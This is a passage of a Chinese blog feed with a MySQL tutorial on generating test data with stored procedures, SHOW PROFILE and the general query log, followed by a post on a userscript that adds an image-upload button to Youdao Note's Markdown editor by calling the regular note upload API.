&lt;span&gt;CREATE&lt;/span&gt; &lt;span&gt;TABLE&lt;/span&gt;&lt;span&gt; dept
(
    deptno &lt;/span&gt;&lt;span&gt;int&lt;/span&gt; unsigned &lt;span&gt;primary&lt;/span&gt; &lt;span&gt;key&lt;/span&gt;&lt;span&gt; auto_increment,
    dname &lt;/span&gt;&lt;span&gt;varchar&lt;/span&gt;(&lt;span&gt;20&lt;/span&gt;) &lt;span&gt;not&lt;/span&gt; &lt;span&gt;null&lt;/span&gt; &lt;span&gt;default&lt;/span&gt; &lt;span&gt;''&lt;/span&gt;&lt;span&gt;,
    loc &lt;/span&gt;&lt;span&gt;varchar&lt;/span&gt;(&lt;span&gt;8&lt;/span&gt;) &lt;span&gt;not&lt;/span&gt; &lt;span&gt;null&lt;/span&gt; &lt;span&gt;default&lt;/span&gt; &lt;span&gt;''&lt;/span&gt;&lt;span&gt;
)ENGINE&lt;/span&gt;&lt;span&gt;=&lt;/span&gt;INNODB &lt;span&gt;DEFAULT&lt;/span&gt; CHARSET&lt;span&gt;=&lt;/span&gt;&lt;span&gt;utf8;

&lt;/span&gt;&lt;span&gt;CREATE&lt;/span&gt; &lt;span&gt;TABLE&lt;/span&gt;&lt;span&gt; emp
(
    id &lt;/span&gt;&lt;span&gt;int&lt;/span&gt; unsigned &lt;span&gt;primary&lt;/span&gt; &lt;span&gt;key&lt;/span&gt;&lt;span&gt; auto_increment,
    empno mediumint unsigned &lt;/span&gt;&lt;span&gt;not&lt;/span&gt; &lt;span&gt;null&lt;/span&gt; &lt;span&gt;default&lt;/span&gt; &lt;span&gt;0&lt;/span&gt;&lt;span&gt;,
    ename &lt;/span&gt;&lt;span&gt;varchar&lt;/span&gt;(&lt;span&gt;20&lt;/span&gt;) &lt;span&gt;not&lt;/span&gt; &lt;span&gt;null&lt;/span&gt; &lt;span&gt;default&lt;/span&gt; &lt;span&gt;''&lt;/span&gt;&lt;span&gt;,
    job &lt;/span&gt;&lt;span&gt;varchar&lt;/span&gt;(&lt;span&gt;9&lt;/span&gt;) &lt;span&gt;not&lt;/span&gt; &lt;span&gt;null&lt;/span&gt; &lt;span&gt;default&lt;/span&gt; &lt;span&gt;''&lt;/span&gt;&lt;span&gt;,
    mgr mediumint unsigned &lt;/span&gt;&lt;span&gt;not&lt;/span&gt; &lt;span&gt;null&lt;/span&gt; &lt;span&gt;default&lt;/span&gt; &lt;span&gt;0&lt;/span&gt;&lt;span&gt;,
    hiredate date &lt;/span&gt;&lt;span&gt;not&lt;/span&gt; &lt;span&gt;null&lt;/span&gt;&lt;span&gt;,
    sal &lt;/span&gt;&lt;span&gt;decimal&lt;/span&gt;(&lt;span&gt;7&lt;/span&gt;,&lt;span&gt;2&lt;/span&gt;) &lt;span&gt;not&lt;/span&gt; &lt;span&gt;null&lt;/span&gt;&lt;span&gt;,
    comm &lt;/span&gt;&lt;span&gt;decimal&lt;/span&gt;(&lt;span&gt;7&lt;/span&gt;,&lt;span&gt;2&lt;/span&gt;) &lt;span&gt;not&lt;/span&gt; &lt;span&gt;null&lt;/span&gt;&lt;span&gt;,
    deptno mediumint unsigned &lt;/span&gt;&lt;span&gt;not&lt;/span&gt; &lt;span&gt;null&lt;/span&gt; &lt;span&gt;default&lt;/span&gt; &lt;span&gt;0&lt;/span&gt;&lt;span&gt;
)ENGINE&lt;/span&gt;&lt;span&gt;=&lt;/span&gt;INNODB &lt;span&gt;DEFAULT&lt;/span&gt; CHARSET&lt;span&gt;=&lt;/span&gt;utf8;
&lt;/pre&gt;&lt;/div&gt;
&lt;span class=&quot;cnblogs_code_collapse&quot;&gt;View Code&lt;/span&gt;&lt;/div&gt;
&lt;h3&gt;&lt;span&gt;2，设置是否可以信任存储函数创建者&lt;/span&gt;&lt;/h3&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&lt;span&gt;#查看binlog状态
show variables &lt;/span&gt;&lt;span&gt;like&lt;/span&gt; &lt;span&gt;'&lt;/span&gt;&lt;span&gt;log_bin%&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;;
#添加可以信任存储函数创建者
&lt;/span&gt;&lt;span&gt;set&lt;/span&gt; global log_bin_trust_function_creators &lt;span&gt;=&lt;/span&gt; &lt;span&gt;1&lt;/span&gt;;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　&lt;img src=&quot;https://img2020.cnblogs.com/blog/1405595/202101/1405595-20210119215025762-588043787.png&quot; width=&quot;600&quot; height=&quot;392&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h3&gt;&lt;span&gt;3，创建函数&lt;/span&gt;&lt;/h3&gt;
&lt;ul&gt;&lt;li&gt;&lt;span&gt;随机产生字符串的函数&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;div class=&quot;cnblogs_code&quot; readability=&quot;38&quot;&gt;
&lt;pre&gt;
&lt;span&gt;# 定义两个 $$ 表示结束 (替换原先的;)
delimiter $$ 
&lt;/span&gt;&lt;span&gt;create&lt;/span&gt; &lt;span&gt;function&lt;/span&gt; rand_string(n &lt;span&gt;int&lt;/span&gt;) &lt;span&gt;returns&lt;/span&gt; &lt;span&gt;varchar&lt;/span&gt;(&lt;span&gt;255&lt;/span&gt;&lt;span&gt;)
&lt;/span&gt;&lt;span&gt;begin&lt;/span&gt;
    &lt;span&gt;declare&lt;/span&gt; chars_str &lt;span&gt;varchar&lt;/span&gt;(&lt;span&gt;100&lt;/span&gt;) &lt;span&gt;default&lt;/span&gt; &lt;span&gt;'&lt;/span&gt;&lt;span&gt;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;;
    &lt;/span&gt;&lt;span&gt;declare&lt;/span&gt; return_str &lt;span&gt;varchar&lt;/span&gt;(&lt;span&gt;255&lt;/span&gt;) &lt;span&gt;default&lt;/span&gt; &lt;span&gt;''&lt;/span&gt;&lt;span&gt;;
    &lt;/span&gt;&lt;span&gt;declare&lt;/span&gt; i &lt;span&gt;int&lt;/span&gt; &lt;span&gt;default&lt;/span&gt; &lt;span&gt;0&lt;/span&gt;&lt;span&gt;;
    &lt;/span&gt;&lt;span&gt;while&lt;/span&gt; i &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt; n do
        &lt;/span&gt;&lt;span&gt;set&lt;/span&gt; return_str &lt;span&gt;=&lt;/span&gt; concat(return_str,&lt;span&gt;substring&lt;/span&gt;(chars_str,&lt;span&gt;floor&lt;/span&gt;(&lt;span&gt;1&lt;/span&gt;&lt;span&gt;+&lt;/span&gt;&lt;span&gt;rand&lt;/span&gt;()&lt;span&gt;*&lt;/span&gt;&lt;span&gt;52&lt;/span&gt;),&lt;span&gt;1&lt;/span&gt;&lt;span&gt;));
        &lt;/span&gt;&lt;span&gt;set&lt;/span&gt; i&lt;span&gt;=&lt;/span&gt;i&lt;span&gt;+&lt;/span&gt;&lt;span&gt;1&lt;/span&gt;&lt;span&gt;;
    &lt;/span&gt;&lt;span&gt;end&lt;/span&gt; &lt;span&gt;while&lt;/span&gt;&lt;span&gt;;
    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; return_str;
&lt;/span&gt;&lt;span&gt;end&lt;/span&gt; $$
&lt;/pre&gt;&lt;/div&gt;
&lt;ul&gt;&lt;li&gt;&lt;span&gt;随机产生部门编号的函数&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&lt;span&gt;delimiter $$
&lt;/span&gt;&lt;span&gt;create&lt;/span&gt; &lt;span&gt;function&lt;/span&gt; rand_num() &lt;span&gt;returns&lt;/span&gt; &lt;span&gt;int&lt;/span&gt;(&lt;span&gt;5&lt;/span&gt;&lt;span&gt;)
&lt;/span&gt;&lt;span&gt;begin&lt;/span&gt;
    &lt;span&gt;declare&lt;/span&gt; i &lt;span&gt;int&lt;/span&gt; &lt;span&gt;default&lt;/span&gt; &lt;span&gt;0&lt;/span&gt;&lt;span&gt;;
    &lt;/span&gt;&lt;span&gt;set&lt;/span&gt; i&lt;span&gt;=&lt;/span&gt;&lt;span&gt;floor&lt;/span&gt;(&lt;span&gt;100&lt;/span&gt;&lt;span&gt;+&lt;/span&gt;&lt;span&gt;rand&lt;/span&gt;()&lt;span&gt;*&lt;/span&gt;&lt;span&gt;10&lt;/span&gt;&lt;span&gt;);
    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; i;
&lt;/span&gt;&lt;span&gt;end&lt;/span&gt; $$
&lt;/pre&gt;&lt;/div&gt;
&lt;h3&gt;&lt;span&gt;4，创建存储过程&lt;/span&gt;&lt;/h3&gt;
&lt;ul&gt;&lt;li&gt;&lt;span&gt;创建往emp表中插入数据的存储过程&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;div class=&quot;cnblogs_code&quot; readability=&quot;50&quot;&gt;
&lt;pre&gt;
&lt;span&gt;delimiter $$
&lt;/span&gt;&lt;span&gt;create&lt;/span&gt; &lt;span&gt;procedure&lt;/span&gt; insert_emp(&lt;span&gt;in&lt;/span&gt; start &lt;span&gt;int&lt;/span&gt;(&lt;span&gt;10&lt;/span&gt;),&lt;span&gt;in&lt;/span&gt; max_num &lt;span&gt;int&lt;/span&gt;(&lt;span&gt;10&lt;/span&gt;&lt;span&gt;))
&lt;/span&gt;&lt;span&gt;begin&lt;/span&gt;
    &lt;span&gt;declare&lt;/span&gt; i &lt;span&gt;int&lt;/span&gt; &lt;span&gt;default&lt;/span&gt; &lt;span&gt;0&lt;/span&gt;&lt;span&gt;;
    &lt;/span&gt;&lt;span&gt;set&lt;/span&gt; autocommit &lt;span&gt;=&lt;/span&gt; &lt;span&gt;0&lt;/span&gt;&lt;span&gt;;
    repeat
        &lt;/span&gt;&lt;span&gt;set&lt;/span&gt; i &lt;span&gt;=&lt;/span&gt; i&lt;span&gt;+&lt;/span&gt;&lt;span&gt;1&lt;/span&gt;&lt;span&gt;;
        &lt;/span&gt;&lt;span&gt;insert&lt;/span&gt; &lt;span&gt;into&lt;/span&gt; emp(empno,ename,job,mgr,hiredate,sal,comm,deptno) &lt;span&gt;values&lt;/span&gt;((start&lt;span&gt;+&lt;/span&gt;i),rand_string(&lt;span&gt;6&lt;/span&gt;),&lt;span&gt;'&lt;/span&gt;&lt;span&gt;salesman&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;,&lt;span&gt;0001&lt;/span&gt;,curdate(),&lt;span&gt;2000&lt;/span&gt;,&lt;span&gt;400&lt;/span&gt;&lt;span&gt;,rand_num());
        until i&lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt;max_num
        &lt;/span&gt;&lt;span&gt;end&lt;/span&gt;&lt;span&gt; repeat;
    &lt;/span&gt;&lt;span&gt;commit&lt;/span&gt;&lt;span&gt;;
&lt;/span&gt;&lt;span&gt;end&lt;/span&gt; $$
&lt;/pre&gt;&lt;/div&gt;
&lt;ul&gt;&lt;li&gt;&lt;span&gt;创建往dept表中插入数据的存储过程&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;div class=&quot;cnblogs_code&quot; readability=&quot;39&quot;&gt;
&lt;pre&gt;
&lt;span&gt;delimiter $$
&lt;/span&gt;&lt;span&gt;create&lt;/span&gt; &lt;span&gt;procedure&lt;/span&gt; insert_dept(&lt;span&gt;in&lt;/span&gt; start &lt;span&gt;int&lt;/span&gt;(&lt;span&gt;10&lt;/span&gt;),&lt;span&gt;in&lt;/span&gt; max_num &lt;span&gt;int&lt;/span&gt;(&lt;span&gt;10&lt;/span&gt;&lt;span&gt;))
&lt;/span&gt;&lt;span&gt;begin&lt;/span&gt;
    &lt;span&gt;declare&lt;/span&gt; i &lt;span&gt;int&lt;/span&gt; &lt;span&gt;default&lt;/span&gt; &lt;span&gt;0&lt;/span&gt;&lt;span&gt;;
    &lt;/span&gt;&lt;span&gt;set&lt;/span&gt; autocommit &lt;span&gt;=&lt;/span&gt; &lt;span&gt;0&lt;/span&gt;&lt;span&gt;;
    repeat
        &lt;/span&gt;&lt;span&gt;set&lt;/span&gt; i &lt;span&gt;=&lt;/span&gt; i&lt;span&gt;+&lt;/span&gt;&lt;span&gt;1&lt;/span&gt;&lt;span&gt;;
        &lt;/span&gt;&lt;span&gt;insert&lt;/span&gt; &lt;span&gt;into&lt;/span&gt; dept(deptno,dname,loc) &lt;span&gt;values&lt;/span&gt;((start&lt;span&gt;+&lt;/span&gt;i),rand_string(&lt;span&gt;10&lt;/span&gt;),rand_string(&lt;span&gt;8&lt;/span&gt;&lt;span&gt;));
        until i&lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt;max_num
        &lt;/span&gt;&lt;span&gt;end&lt;/span&gt;&lt;span&gt; repeat;
    &lt;/span&gt;&lt;span&gt;commit&lt;/span&gt;&lt;span&gt;;
&lt;/span&gt;&lt;span&gt;end&lt;/span&gt; $$
&lt;/pre&gt;&lt;/div&gt;
&lt;h3&gt;&lt;span&gt;5，调用存储过程生成数据&lt;/span&gt;&lt;/h3&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;#向 部门表插入10条数据
DELIMITER ;
CALL insert_dept(&lt;/span&gt;&lt;span&gt;100&lt;/span&gt;, &lt;span&gt;10&lt;/span&gt;&lt;span&gt;);
#向 员工表插入50w条数据
CALL insert_emp(&lt;/span&gt;&lt;span&gt;100001&lt;/span&gt;, &lt;span&gt;500000&lt;/span&gt;);
&lt;/pre&gt;&lt;/div&gt;
&lt;h2&gt;&lt;span&gt;四、show profiles&lt;/span&gt;&lt;/h2&gt;
&lt;h3&gt;&lt;span&gt;1，介绍&lt;/span&gt;&lt;/h3&gt;
&lt;ul&gt;&lt;li&gt;&lt;span&gt;show profile是mysql提供可以用来分析当前会话中语句执行的资源消耗情况。可以用于SQL的调优测量。&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;默认情况下，参数处于&lt;strong&gt;关闭状态&lt;/strong&gt;，并保存最近15次的运行结果&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;h3&gt;&lt;span&gt;2，开启&lt;/span&gt;&lt;/h3&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&lt;span&gt;#查看 Show Profile 是否开启
show variables &lt;/span&gt;&lt;span&gt;like&lt;/span&gt; ‘profiling&lt;span&gt;%&lt;/span&gt;&lt;span&gt;’;
#开启 Show Profile
&lt;/span&gt;&lt;span&gt;set&lt;/span&gt; profiling&lt;span&gt;=&lt;/span&gt;&lt;span&gt;on&lt;/span&gt;;
&lt;/pre&gt;&lt;/div&gt;
&lt;h3&gt;&lt;span&gt;3，使用show profiles&lt;/span&gt;&lt;/h3&gt;
&lt;ul&gt;&lt;li&gt;&lt;span&gt;创建测试数据&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
&lt;span&gt;select&lt;/span&gt; &lt;span&gt;*&lt;/span&gt; &lt;span&gt;from&lt;/span&gt; emp &lt;span&gt;group&lt;/span&gt; &lt;span&gt;by&lt;/span&gt; id&lt;span&gt;%&lt;/span&gt;&lt;span&gt;10&lt;/span&gt; limit &lt;span&gt;150000&lt;/span&gt;&lt;span&gt;;
&lt;/span&gt;&lt;span&gt;select&lt;/span&gt; &lt;span&gt;*&lt;/span&gt; &lt;span&gt;from&lt;/span&gt; emp &lt;span&gt;group&lt;/span&gt; &lt;span&gt;by&lt;/span&gt; id&lt;span&gt;%&lt;/span&gt;&lt;span&gt;10&lt;/span&gt; limit &lt;span&gt;150000&lt;/span&gt;&lt;span&gt;;
&lt;/span&gt;&lt;span&gt;select&lt;/span&gt; &lt;span&gt;*&lt;/span&gt; &lt;span&gt;from&lt;/span&gt; emp &lt;span&gt;group&lt;/span&gt; &lt;span&gt;by&lt;/span&gt; id&lt;span&gt;%&lt;/span&gt;&lt;span&gt;10&lt;/span&gt; &lt;span&gt;order&lt;/span&gt; &lt;span&gt;by&lt;/span&gt; &lt;span&gt;5&lt;/span&gt;&lt;span&gt;;
&lt;/span&gt;&lt;span&gt;select&lt;/span&gt; &lt;span&gt;*&lt;/span&gt; &lt;span&gt;from&lt;/span&gt;&lt;span&gt; emp
&lt;/span&gt;&lt;span&gt;select&lt;/span&gt; &lt;span&gt;*&lt;/span&gt; &lt;span&gt;from&lt;/span&gt;&lt;span&gt; dept
&lt;/span&gt;&lt;span&gt;select&lt;/span&gt; &lt;span&gt;*&lt;/span&gt; &lt;span&gt;from&lt;/span&gt; emp &lt;span&gt;left&lt;/span&gt; &lt;span&gt;join&lt;/span&gt; dept &lt;span&gt;on&lt;/span&gt; emp.deptno &lt;span&gt;=&lt;/span&gt; dept.deptno
&lt;/pre&gt;&lt;/div&gt;
&lt;ul&gt;&lt;li&gt;&lt;span&gt;执行show profiles&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;　　&lt;img src=&quot;https://img2020.cnblogs.com/blog/1405595/202101/1405595-20210119224108707-1738799477.png&quot; width=&quot;700&quot; height=&quot;186&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;span&gt;执行 show profile cpu, block io for query Query_ID;&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;　　&lt;img src=&quot;https://img2020.cnblogs.com/blog/1405595/202101/1405595-20210119225115038-192066700.png&quot; width=&quot;750&quot; height=&quot;414&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;
&lt;ul&gt;&lt;li&gt; 检索参数&lt;/li&gt;
&lt;li readability=&quot;-0.5&quot;&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;ALL&lt;/span&gt;&lt;span&gt;：显示所有的开销信息
BLOCK IO：显示块IO相关开销
CONTEXT SWITCHES：上下文切换相关开销
CPU：显示CPU相关开销信息
IPC：显示发送和接收相关开销信息
MEMORY：显示内存相关开销信息
PAGE FAULTS：显示页面错误相关开销信息
SOURCE：显示和Source_function，Source_file，Source_line相关的开销信息
SWAPS：显示交换次数相关开销的信息&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;ul&gt;&lt;li&gt;
&lt;ul&gt;&lt;li&gt;返回结果&lt;/li&gt;
&lt;li readability=&quot;-0.5&quot;&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
converting HEAP &lt;span&gt;to&lt;/span&gt;&lt;span&gt; MyISAM：查询结果太大，内存都不够用了往磁盘上搬了。
Creating tmp &lt;/span&gt;&lt;span&gt;table&lt;/span&gt;&lt;span&gt;：创建临时表，mysql 先将拷贝数据到临时表，然后用完再将临时表删除
Copying &lt;/span&gt;&lt;span&gt;to&lt;/span&gt; tmp &lt;span&gt;table&lt;/span&gt; &lt;span&gt;on&lt;/span&gt; &lt;span&gt;disk&lt;/span&gt;&lt;span&gt;：把内存中临时表复制到磁盘，危险！！！
locked：锁表&lt;/span&gt; 
&lt;/pre&gt;&lt;/div&gt;
&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;h2&gt;&lt;span&gt;五、全局查询日志&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;&lt;span&gt;　　&lt;strong&gt;&lt;span&gt;切莫在生产环境配置启用&lt;/span&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;strong&gt;&lt;span&gt;在my.cnf中配置&lt;/span&gt;&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&lt;span&gt;# 开启
general_log&lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt;1&lt;/span&gt;&lt;span&gt;
# 记录日志文件的路径
general_log_file&lt;/span&gt;&lt;span&gt;=/&lt;/span&gt;path&lt;span&gt;/&lt;/span&gt;&lt;span&gt;logfile
# 输出格式
log_output&lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt;FILE&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;ul&gt;&lt;li&gt;&lt;strong&gt;&lt;span&gt;编码启用&lt;/span&gt;&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
&lt;span&gt;set&lt;/span&gt; global general_log&lt;span&gt;=&lt;/span&gt;&lt;span&gt;1&lt;/span&gt;&lt;span&gt;;
&lt;/span&gt;&lt;span&gt;set&lt;/span&gt; global log_output&lt;span&gt;=&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;TABLE&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;;
&lt;/pre&gt;&lt;/div&gt;
&lt;ul&gt;&lt;li&gt;&lt;span&gt;配置完成之后，将会&lt;strong&gt;记录&lt;/strong&gt;到mysql库里的&lt;strong&gt;general_log&lt;/strong&gt;表&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
&lt;span&gt;select&lt;/span&gt; &lt;span&gt;*&lt;/span&gt; &lt;span&gt;from&lt;/span&gt; mysql.general_log;
&lt;/pre&gt;&lt;/div&gt;

</description>
<pubDate>Tue, 19 Jan 2021 15:07:00 +0000</pubDate>
<dc:creator>MXC肖某某</dc:creator>
<og:description>一、查询优化 1，mysql的调优大纲 慢查询的开启并捕获 explain+慢SQL分析 show profile查询SQL在Mysql服务器里面的执行细节和生命周期情况 SQL数据库服务器的参数调优</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/bbgs-xc/p/14293709.html</dc:identifier>
</item>
<item>
<title>有道云笔记非会员上传图片 - 满赋诸机</title>
<link>http://www.cnblogs.com/manfuzhuji/p/14300544.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/manfuzhuji/p/14300544.html</guid>
<description>&lt;h2 id=&quot;背景&quot;&gt;背景&lt;/h2&gt;
&lt;p&gt;先看一下目前的效果：在「Markdown 笔记」原有的上传图片弹窗中增加了一个我们自定义的上传按钮，通过直接与后端 API 交互完成图片上传（相关 API 是「笔记」上传时公开使用的）。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://github.com/idealism-xxm/tampermonkey/raw/master/note-youdao/%E6%BC%94%E7%A4%BA.gif&quot; alt=&quot;演示&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;两年前还没开始使用 GitHub 记录读书笔记，那时在用有道云笔记。我使用的是 「Markdown 笔记」，在最开始一段时间没有上传图片的需求，所以用起来还可以。后来开始记录《Head First 设计模式》的读书笔记，并画了每个模式的类图，开始有了上传图片的需求，而官方将 「Markdown 笔记」上传图片的功能仅对会员开放。&lt;/p&gt;
&lt;p&gt;穷则思变，机智的我就注意到了以前使用「笔记」时可以直接上传图片，并且没有会员限制，将这个图片的链接放到「Markdown 笔记」内也可正常使用。所以就先人工操作，每次需要上传图片时，先切到一个自己建立的用于上传图片的「笔记」，图片上传成功后再将链接拷贝回「Markdown 笔记」，暂时解决了上传图片的需求。&lt;/p&gt;
&lt;p&gt;懒是第一生产力，做程序员最大的好处就是可以通过写代码简化日常网上活动的各种重复性操作。在按照前面的方式完成几篇带图片的「Markdown 笔记」后，就开始感到厌烦，这一操作机械重复没有任何价值，所以就想到很适合通过代码自动执行。&lt;/p&gt;
&lt;h2 id=&quot;实现流程&quot;&gt;实现流程&lt;/h2&gt;
&lt;p&gt;由于我们需要的图片上传功能在「Markdown 笔记」页面中没有，所以不能使用操作页面元素的方式，只能通过抓 API ，并且自己调用 API 来实现图片上传。&lt;/p&gt;
&lt;h3 id=&quot;封装-api&quot;&gt;封装 API&lt;/h3&gt;
&lt;p&gt;封装 API 前我们需要抓 API ，这个很简单，其实就是触发一下我们所需要实现的功能，然后查看浏览器发送了哪些请求，记住这些请求并封装一下，以便后续调用。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://github.com/idealism-xxm/tampermonkey/raw/master/note-youdao/%E6%8A%93%20API.png&quot; alt=&quot;抓 API&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;「笔记」图片上传操作后会发现浏览器发送了三个请求：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;第一个是获取 &lt;code&gt;transmitId&lt;/code&gt; 以供后续两个请求使用&lt;/li&gt;
&lt;li&gt;第二个是使用 &lt;code&gt;transmitId&lt;/code&gt; 上传图片（这里仅实现了小文件单次上传）&lt;/li&gt;
&lt;li&gt;第三个是使用 &lt;code&gt;transmitId&lt;/code&gt; 给上传完成的文件添加各种信息，并获取图片地址&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;一个简单的图片上传只需要三个请求，所以我们先封装一下，具体实现可以在 &lt;a href=&quot;https://github.com/idealism-xxm/tampermonkey/blob/master/note-youdao/src/api.js&quot; target=&quot;_blank&quot;&gt;api.js&lt;/a&gt; 找到（其中还封装了其他 API ，不过后续没有使用到）&lt;/p&gt;
&lt;h3 id=&quot;封装上传组件&quot;&gt;封装上传组件&lt;/h3&gt;
&lt;p&gt;点击完上传后，我们需要一个组件来实现选择图片、上传图片、返回图片地址这三个操作。我们在前面封装的 API 已经实现了上传图片并返回图片地址的功能，所以在这里我们这个组件只需要能触发选择图片逻辑即可。我们可以通过 &lt;code&gt;&amp;lt;input type=&quot;file&quot;&amp;gt;&lt;/code&gt; 来实现选择文件的功能，然后我们需要对其注册 &lt;code&gt;change&lt;/code&gt; 事件，用于当用户选择完图片后，实现后续的操作逻辑。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-javascript&quot;&gt;// 上传文件，触发后，会选择文件，并执行上传文件获取url，最后执行回调（回调的第一个参数是文件，第二个参数是上传的url）
function upload(accept, callback) {
    // 1. 创建 input 节点
    if($('#diy-uploader-input').length == 0) {
        $('body').append('&amp;lt;input id=&quot;diy-uploader-input&quot; type=&quot;file&quot; style=&quot;position: absolute; top: -1000px; left: -1000px;&quot; accept=&quot;' + accept + '&quot;&amp;gt;');
    }

    // 2. 并绑定点击事件，用于触发 实际执行上传
    var $this = this;
    $('#diy-uploader-input').on('change', function(event) {
        var file = event.target.files[0];
        var url = $this.doUpload(file);
        // 执行回调
        callback(file, url);
    });

    // 3. 执行模拟点击
    $('#diy-uploader-input').click();
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;封装上传功能&quot;&gt;封装上传功能&lt;/h3&gt;
&lt;p&gt;现在我们已经拥有了上传图片的能力，接下来就是要将这个能力添加到我们的「Markdown 笔记」中，我们需要支持两个功能：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;在弹出上传的窗口中增加一个按钮，以便我们使用自定义的上传&lt;/li&gt;
&lt;li&gt;上传成功后将相关信息回填到窗口中的对应字段&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;当时还没怎么接触过 &lt;code&gt;HTML&lt;/code&gt; 和 &lt;code&gt;JavaScript&lt;/code&gt; ，但这两个功能比较简单，编程的基本原理也没有使用新的知识体系，所以很快就能写出能完成功能的代码（&lt;s&gt;省略中间处理各种问题的过程&lt;/s&gt;）。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-javascript&quot;&gt;// 初始化，当md文件上传弹框出来的时候，添加上传图片按钮
function init() {
    // 有道云笔记用 on 绑定 DOMNodeInserted 不生效 - -|||
    $('body')[0].addEventListener(&quot;DOMNodeInserted&quot;, function(e){
        // 如果是 markdown 上传图片的节点被添加
        if(e.target.nodeName.toLowerCase()== 'markdown-upload-image') {
            var divButtonBarSelector = 'body &amp;gt; dialog-overlay &amp;gt; div &amp;gt; div &amp;gt; div.widget-dialog-body &amp;gt; markdown-upload-image &amp;gt; div &amp;gt; div.button-bar';

            // 如果 底部按钮栏已出来，并且没添加过 上传按钮，则添加 上传按钮
            if($(divButtonBarSelector).length == 1 &amp;amp;&amp;amp; $('#diy-uploader-button').length == 0) {
                // 添加按钮
                var uploaderButton = '&amp;lt;div id=&quot;diy-uploader-button&quot; class=&quot;loadbtn local-img&quot; style=&quot;margin-right:15px;height:34px&quot;&amp;gt;上传图片&amp;lt;/div&amp;gt;';
                $('body &amp;gt; dialog-overlay &amp;gt; div &amp;gt; div &amp;gt; div.widget-dialog-body &amp;gt; markdown-upload-image &amp;gt; div &amp;gt; div.button-bar').prepend(uploaderButton);

                // 给按钮添加事件
                $('#diy-uploader-button').on('click', function() {
                    component.uploader.upload('image/*', feature.mdImageUploader.backfillPage);
                });
            }
        }
    }, false);
}

// 回填页面
function backfillPage(file, url) {
    // 填入url
    var urlSelector = 'body &amp;gt; dialog-overlay &amp;gt; div &amp;gt; div &amp;gt; div.widget-dialog-body &amp;gt; markdown-upload-image &amp;gt; div &amp;gt; div:nth-child(2) &amp;gt; div.edit-container &amp;gt; input';
    $(urlSelector).val(url);
    // 触发 input 事件，更新双向绑定的数据
    tool.trigger(urlSelector, 'input');

    // 填入文件名
